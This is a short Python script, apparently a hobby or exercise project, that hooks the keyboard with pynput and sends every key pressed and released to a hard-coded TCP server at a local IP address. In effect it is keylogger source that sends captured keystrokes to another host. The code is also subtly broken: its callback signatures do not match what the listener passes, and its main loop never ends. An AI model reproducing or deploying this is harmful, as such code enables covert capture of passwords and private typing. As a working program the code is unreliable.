import socket
from pynput import keyboard

SERVER_ADDRESS = ("192.168.1.134", 9090)
BUFFER_SIZE = 4096

def on_press(socket, key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        socket.sendall("{0}".format(key.char).encode())
        messaggio = socket.recv(BUFFER_SIZE)
        print(messaggio.decode())
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(socket, key):
    print('{0} released'.format(
        key))
    socket.sendall("release".encode())
    messaggio = socket.recv(BUFFER_SIZE)
    print(messaggio.decode())
    if key == keyboard.Key.esc:
        # Stop listener
        socket.sendall("esc".encode())
        messaggio = socket.recv(BUFFER_SIZE)
        print(messaggio.decode())
        return False

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERVER_ADDRESS)
    messaggio = s.recv(BUFFER_SIZE)
    print(messaggio.decode())
    
    while True:
        with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
            listener.join()

if __name__ == "__main__":
    main()